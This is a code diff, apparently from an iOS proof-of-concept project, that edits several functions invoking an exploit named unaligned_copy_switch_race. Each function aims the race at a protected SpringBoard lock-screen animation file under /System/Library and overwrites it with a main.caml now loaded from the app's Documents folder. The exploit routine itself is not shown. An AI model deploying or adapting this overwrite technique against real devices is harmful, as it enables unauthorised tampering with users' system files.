@@ -349,35 +349,45 @@ T_DECL(unaligned_copy_switch_race,
 }
 
 void poc812(void) {
-    const char *model_path = [[[NSBundle mainBundle] bundlePath] stringByAppendingPathComponent:@"main.caml"].UTF8String;
+    NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+    NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+    const char *model_path = dirName.UTF8String;
     g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-812h.ca/main.caml";
     g_arg_overwrite_file_path = model_path;
     unaligned_copy_switch_race();
 }
 
 void poc73(void) {
-    const char *model_path = [[[NSBundle mainBundle] bundlePath] stringByAppendingPathComponent:@"main.caml"].UTF8String;
+    NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+    NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+    const char *model_path = dirName.UTF8String;
     g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-d73.ca/main.caml";
     g_arg_overwrite_file_path = model_path;
     unaligned_copy_switch_race();
 }
 
 void poc896(void) {
-    const char *model_path = [[[NSBundle mainBundle] bundlePath] stringByAppendingPathComponent:@"main.caml"].UTF8String;
+    NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+    NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+    const char *model_path = dirName.UTF8String;
     g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@3x-896h.ca/main.caml";
     g_arg_overwrite_file_path = model_path;
     unaligned_copy_switch_race();
 }
 
 void poc2x896(void) {
-    const char *model_path = [[[NSBundle mainBundle] bundlePath] stringByAppendingPathComponent:@"main.caml"].UTF8String;
+    NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+    NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+    const char *model_path = dirName.UTF8String;
     g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@2x-896h.ca/main.caml";
     g_arg_overwrite_file_path = model_path;
     unaligned_copy_switch_race();
 }
 
 void poc2x812(void) {
-    const char *model_path = [[[NSBundle mainBundle] bundlePath] stringByAppendingPathComponent:@"main.caml"].UTF8String;
+    NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
+    NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
+    const char *model_path = dirName.UTF8String;
     g_arg_target_file_path = "/System/Library/PrivateFrameworks/SpringBoardUIServices.framework/lock@2x-812h.ca/main.caml";
     g_arg_overwrite_file_path = model_path;
     unaligned_copy_switch_race();
